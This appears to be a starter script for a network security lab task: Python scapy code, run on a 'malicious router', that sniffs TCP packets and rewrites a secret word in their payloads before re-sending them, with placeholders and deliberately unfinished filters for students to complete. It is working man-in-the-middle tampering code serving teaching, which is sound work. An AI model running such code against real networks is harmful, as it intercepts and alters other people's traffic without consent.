#!/usr/bin/env python3
# Sample sniff-and-spoof code for Task 2. Run as root on THIS machine
# (malicious_router, 10.9.0.111) after you have disabled IP forwarding:
#
#   sysctl net.ipv4.ip_forward=0
#
# You must:
#   1. Replace b'PUT_SECRET_WORD_HERE' below with the bytes of the secret
#      word from secret_word.txt, and replace it with a same-length run of
#      b'A' characters (get the length right or you will desync the TCP
#      connection).
#   2. Fix the capture filter. As written it captures ALL tcp traffic,
#      including the packets this very script re-injects with send() -
#      which will make it re-process (and re-send) its own output forever.
#      Question 4 asks which single direction you actually need to capture,
#      and Question 5 asks whether you should filter on the victim's IP
#      address or its MAC address - try both and see what goes wrong with
#      the wrong one.

from scapy.all import *

SECRET = b'PUT_SECRET_WORD_HERE'
REPLACEMENT = b'A' * len(SECRET)

def spoof_pkt(pkt):
    newpkt = IP(bytes(pkt[IP]))
    del newpkt.chksum
    del newpkt[TCP].payload
    del newpkt[TCP].chksum

    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print("*** %s, length: %d" % (data, len(data)))
        newdata = data.replace(SECRET, REPLACEMENT)
        send(newpkt / newdata)
    else:
        send(newpkt)

# TODO: narrow this filter (see points 1 and 2 above).
f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
